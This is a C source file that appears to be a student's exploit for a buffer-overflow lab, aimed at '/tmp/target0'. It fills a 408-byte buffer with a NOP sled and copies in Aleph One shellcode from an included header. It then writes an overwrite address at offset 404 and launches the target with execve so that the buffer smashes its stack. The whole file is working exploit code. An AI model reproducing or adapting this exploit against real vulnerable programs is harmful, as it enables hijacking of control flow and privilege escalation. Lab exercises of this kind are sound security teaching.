#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

#define BUFFER_SIZE 408

unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

int main(void)
{
  char *args[3]; 
  char buffer[BUFFER_SIZE]; // Make larger size as target program?
  char *env[1];
  
  // Initialize buffer with NOP instructions
  memset(buffer, 0x90, BUFFER_SIZE-4);

  // Copy over shellcode
  memcpy(buffer + 203, shellcodeAlephOne, sizeof(shellcodeAlephOne)-1); // There's a 0 byte at the end of this?!?!
  printf("Size of shellcode AlephOne: %d\n", sizeof(shellcodeAlephOne));

  memcpy(buffer+404, addr, sizeof(addr)-1);
  printf("Size of addr: %d\n", sizeof(addr));

  // Print out buffer for testing
  // for (int i = 0; i < BUFFER_SIZE; i++) {
  //   printf("Buffer[%d] = 0x%x\n", i, buffer[i]); 
  // }

  args[0] = TARGET; // Must contain filename of file being executed
  args[1] = buffer;
  args[2] = NULL; // argv and envp arrays must each include a null pointer at end of array

  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
